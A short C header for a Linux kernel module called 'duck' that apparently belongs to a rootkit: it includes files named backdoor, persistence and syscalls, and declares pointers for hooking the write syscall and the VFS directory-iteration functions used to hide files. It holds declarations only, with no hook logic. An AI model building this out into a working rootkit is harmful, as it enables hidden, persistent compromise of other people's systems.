#ifndef _DUCK_H_
#define _DUCK_H_

#include "backdoor.h"
#include "common.h"
#include "list.h"
#include "misc.h"
#include "persistence.h"
#include "preempt.h"
#include "syscalls.h"
#include "vfs.h"

MODULE_LICENSE("GPL");

int duck_init(void);
void duck_exit(void);
module_init(duck_init);
module_exit(duck_exit);

asmlinkage ssize_t (*original_write)(int fd, const char __user *buff, ssize_t count);
int (*vfs_original_iterate)(struct file *, struct dir_context *);
int (*vfs_original_filldir)(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);

#endif /* _DUCK_H_ */